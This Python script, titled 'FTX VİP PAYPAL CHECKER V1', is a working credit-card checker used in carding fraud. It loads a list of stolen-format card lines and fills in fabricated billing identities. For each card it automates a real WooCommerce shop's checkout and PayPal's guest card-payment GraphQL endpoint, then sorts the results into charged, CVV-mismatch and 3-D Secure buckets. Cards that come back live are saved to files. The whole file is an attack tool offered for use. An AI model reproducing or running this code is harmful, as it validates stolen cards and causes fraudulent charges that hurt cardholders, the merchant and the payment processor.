import requests
import re
import random
import string
import os
from datetime import datetime

# Renkler
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
P = '\033[95m'
W = '\033[0m'
B = '\033[1m'

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{P}
    ╔{'═'*58}╗
    ║{B}                FTX VİP PAYPAL CHECKER V1           {P}║
    ║              New Clean| Charge And All Resp       {P}║
    ╚{'═'*58}╝{W}
    """)

# Orijinal fake info fonksiyonları (hiç dokunmadım)
def generate_full_name():
    first_names = ["John", "David", "Michael", "Chris", "Daniel"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago"]
    states = ["NY", "CA", "IL"]
    streets = ["Main St", "Broadway", "5th Ave"]
    zips = ["10080", "90001", "60601"]
    return random.choice(cities), random.choice(states), random.choice(streets), random.choice(zips)

def generate_random_account():
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(8)) + "@gmail.com"

def generate_phone():
    return str(random.randint(2000000000, 9999999999))

def generate_user_agent():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0"
    ]
    return random.choice(uas)

def generate_random_string(n):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

# SENİN ORİJİNAL process_card FONKSİYONUN (HİÇBİR SATIRINI DEĞİŞTİRMEDİM)
def process_card(card_data):
    try:
        parts = card_data.split("|")
        if len(parts) < 4:
            return {"status": "DECLINED", "message": "Invalid card format"}

        n, mm, yy, cvc = [p.strip() for p in parts]

        if not re.match(r"^\d{13,19}$", n):
            return {"status": "DECLINED", "message": "Invalid card number"}

        if len(mm) == 1:
            mm = "0" + mm

        if "20" in yy:
            yy = yy[-2:]

        if cvc == "000":
            return {"status": "DECLINED", "message": "Gen Koyma Bilader"}

        first_name, last_name = generate_full_name()
        city, state, street, zip_code = generate_address()
        acc = generate_random_account()
        phone = generate_phone()
        user_agent = generate_user_agent()

        session = requests.Session()
        session.headers.update({"user-agent": user_agent})

        # Step 1
        session.post(
            "https://switchupcb.com/shop/i-buy/",
            data="quantity=1&add-to-cart=4451",
            headers={"content-type": "application/x-www-form-urlencoded"}
        )

        # Step 2
        r = session.get("https://switchupcb.com/checkout/")
        html = r.text

        sec = re.search(r'update_order_review_nonce":"(.*?)"', html)
        nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', html)
        check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', html)
        create = re.search(r'create_order.*?nonce":"(.*?)"', html)

        if not (sec and check and create):
            return {"status": "DECLINED", "message": "Gateway error"}

        sec, check, create = sec.group(1), check.group(1), create.group(1)

        # Step 3
        data = {
            "security": sec,
            "payment_method": "stripe",
            "billing_first_name": first_name,
            "billing_last_name": last_name,
            "billing_country": "US",
            "billing_address_1": street,
            "billing_city": city,
            "billing_state": state,
            "billing_postcode": zip_code,
            "billing_phone": phone,
            "billing_email": acc,
            "woocommerce-process-checkout-nonce": check,
        }
        session.post("https://switchupcb.com/?wc-ajax=update_order_review", data=data)

        # Step 4
        json_data = {
            "nonce": create,
            "payer": None,
            "bn_code": "Woo_PPCP",
            "context": "checkout",
            "order_id": "0",
            "payment_method": "ppcp-gateway",
            "funding_source": "card",
            "form_encoded": f"billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}",
            "createaccount": False,
            "save_payment_method": False,
        }
        r = session.post("https://switchupcb.com/?wc-ajax=ppc-create-order", json=json_data)
        data = r.json()
        if "data" not in data or "id" not in data["data"]:
            return {"status": "DECLINED", "message": "Order create failed"}
        order_id = data["data"]["id"]

        lol1 = generate_random_string(10)
        lol2 = generate_random_string(10)
        lol3 = generate_random_string(11)
        session_id = f"uid_{lol1}_{lol3}"
        button_session_id = f"uid_{lol2}_{lol3}"

        session.get(f"https://www.paypal.com/smart/card-fields?sessionID={session_id}&buttonSessionID={button_session_id}&token={order_id}")

        # Step 5 - GraphQL (orijinal halini korudum)
        payment_data = {
            "query": """mutation payWithCard($token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int $identityDocument: IdentityDocumentInput) {
              approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm identityDocument: $identityDocument) {
                flags { is3DSecureRequired }
                cart { intent cartId }
                paymentContingencies { threeDomainSecure { status method } }
              }
            }""",
            "variables": {
                "token": order_id,
                "card": {
                    "cardNumber": n,
                    "type": "VISA",
                    "expirationDate": f"{mm}/20{yy}",
                    "postalCode": zip_code,
                    "securityCode": cvc
                },
                "firstName": first_name,
                "lastName": last_name,
                "billingAddress": {
                    "givenName": first_name,
                    "familyName": last_name,
                    "line1": "New York",
                    "line2": None,
                    "city": "New York",
                    "state": "NY",
                    "postalCode": "10080",
                    "country": "US",
                },
                "email": acc,
                "currencyConversionType": "VENDOR",
            },
        }

        r = session.post("https://www.paypal.com/graphql?fetch_credit_form_submit", json=payment_data)
        last = r.text

        if any(x in last for x in ["ADD_SHIPPING_ERROR", "NEED_CREDIT_CARD", '"status": "succeeded"', "Thank You For Donation.", "Your payment has already been processed", "Success "]):
            return {"status": "APPROVED", "message": "CHARGED"}
        elif "is3DSecureRequired" in last or "OTP" in last:
            return {"status": "APPROVED", "message": "3D SECURE"}
        elif "INVALID_SECURITY_CODE" in last:
            return {"status": "APPROVED", "message": "CCN MISMATCH"}
        elif "INVALID_BILLING_ADDRESS" in last:
            return {"status": "APPROVED", "message": "AVS MISMATCH"}
        elif "EXISTING_ACCOUNT_RESTRICTED" in last:
            return {"status": "APPROVED", "message": "RESTRICTED"}
        else:
            try:
                response_json = r.json()
                message = response_json["errors"][0]["message"]
                code = response_json["errors"][0]["data"][0]["code"]
                return {"status": "DEAD", "message": f"{message}({code})"}
            except:
                return {"status": "DEAD", "message": "CARD DECLINED"}

    except Exception as e:
        return {"status": "DEAD", "message": "GATEWAY ERROR"}

# ANA KISIM – TXT OKUMA + GÜZEL GÖSTERİM
if __name__ == "__main__":
    banner()
    dosya = input(f"{Y}[+] Enter Card Format Txt (ex: ftx.txt): {W}").strip()
    
    if not os.path.isfile(dosya):
        print(f"{R}[-] File not found bro!{W}")
        exit()

    with open(dosya, "r", encoding="utf-8", errors="ignore") as f:
        kartlar = [line.strip() for line in f if line.strip() and "|" in line]

    toplam = len(kartlar)
    live = ccn = d3 = dead = 0

    print(f"{G}[+] {toplam} Card loaded, starting...\n{W}")

    for i, kart in enumerate(kartlar, 1):
        if kart.count("|") != 3:
            print(f"{R}[{i:03d}] {kart} → İNVALİD FORMAT{W}")
            dead += 1
            continue

        sonuc = process_card(kart)
        status = sonuc["status"]
        msg = sonuc["message"]

        if "CHARGED" in msg:
            renk = G
            live += 1
            with open("CHARGED.txt", "a", encoding="utf-8") as f:
                f.write(f"{kart} | CHARGED\n")
        elif "CCN" in msg:
            renk = Y
            ccn += 1
            with open("CCN.txt", "a", encoding="utf-8") as f:
                f.write(f"{kart} | CCN LIVE\n")
        elif "3D" in msg:
            renk = C
            d3 += 1
            with open("3DS.txt", "a", encoding="utf-8") as f:
                f.write(f"{kart} | 3DS\n")
        else:
            renk = R
            dead += 1

        print(f"{renk}[{i:03d}/{toplam}] {kart} → {status} | {msg}{W}")

    print(f"\n{P}{B}╔{'═'*50}╗")
    print(f"║{' TEST BİTTİ ':-^50}║")
    print(f"║  CHARGED: {live:<5} CCN: {ccn:<5} 3DS: {d3:<5} DEAD: {dead:<5}  ║")
    print(f"╚{'═'*50}╝{W}")
    input(f"\n{C}ENTER to exit...{W}")